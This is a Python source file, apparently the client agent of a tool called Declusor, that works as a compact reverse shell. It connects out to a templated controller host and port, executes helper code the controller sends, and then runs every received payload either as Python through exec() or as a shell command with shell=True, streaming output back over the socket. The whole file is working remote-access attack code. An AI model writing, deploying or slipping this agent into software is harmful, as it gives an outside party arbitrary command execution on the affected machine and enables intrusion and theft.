#!/usr/bin/env python3
"""Declusor py_socket compact reverse-shell agent."""

import io
import socket
import struct
import subprocess
import sys

HOST = "$DECLUSOR_HOST"
PORT = int("$DECLUSOR_PORT")
ACKNOWLEDGE = bytes.fromhex("$DECLUSOR_ACKNOWLEDGE")

SESSION_SCOPE = {"__name__": "__declusor__"}


def _read_exact(sock: socket.socket, length: int) -> bytes | None:
    buf = bytearray()

    while len(buf) < length:
        chunk = sock.recv(length - len(buf))

        if not chunk:
            return None

        buf.extend(chunk)

    return bytes(buf)


def _read_frame(sock: socket.socket) -> bytes | None:
    header = _read_exact(sock, 5)

    if header is None:
        return None

    _, length = struct.unpack(">BI", header)

    return _read_exact(sock, length)


def _send_frame(sock: socket.socket, channel: int, data: bytes) -> None:
    sock.sendall(struct.pack(">BI", channel, len(data)) + data)


def _is_python(code: str) -> bool:
    stripped = code.strip()

    if not stripped:
        return True

    if stripped.startswith("#!"):
        first_line = stripped.splitlines()[0].lower()
        return "python" in first_line

    if any(stripped.startswith(fn + "(") for fn in SESSION_SCOPE):
        return True

    in_docstring = False
    doc_delim = ""
    keywords = (
        "import ",
        "from ",
        "def ",
        "class ",
        "async ",
        "with ",
        "try:",
        "print(",
        "exec(",
        "eval(",
        "sys.",
        "os.",
    )

    for raw_line in stripped.splitlines():
        line = raw_line.strip()

        if not line:
            continue

        if in_docstring:
            if doc_delim in line:
                in_docstring = False
            continue

        if line.startswith(('"""', "'''")):
            doc_delim = line[:3]
            if line.count(doc_delim) < 2:
                in_docstring = True
            continue

        if line.startswith("#"):
            continue

        return any(line.startswith(kw) for kw in keywords)

    return False


def _execute(payload: str, sock: socket.socket) -> None:
    if _is_python(payload):
        buf = io.StringIO()
        old_out, old_err = sys.stdout, sys.stderr

        try:
            sys.stdout = sys.stderr = buf
            exec(payload, SESSION_SCOPE)
        except (Exception, SystemExit) as exc:
            buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
        finally:
            sys.stdout, sys.stderr = old_out, old_err

        output = buf.getvalue().encode(errors="replace")

        if output:
            _send_frame(sock, 1, output)

        _send_frame(sock, 0, b"")
    else:
        proc = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S602

        while proc.stdout:
            chunk = proc.stdout.read(4096)

            if not chunk:
                break

            _send_frame(sock, 1, chunk)

        proc.wait()

        _send_frame(sock, 0, b"")


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        helpers_bytes = _read_frame(sock)

        if helpers_bytes:
            try:
                exec(helpers_bytes.decode(errors="replace"), SESSION_SCOPE)  # noqa: S102
            except (Exception, SystemExit):
                pass

        sock.sendall(ACKNOWLEDGE)

        while (payload_bytes := _read_frame(sock)) is not None:
            _execute(payload_bytes.decode(errors="replace"), sock)


if __name__ == "__main__":
    main()
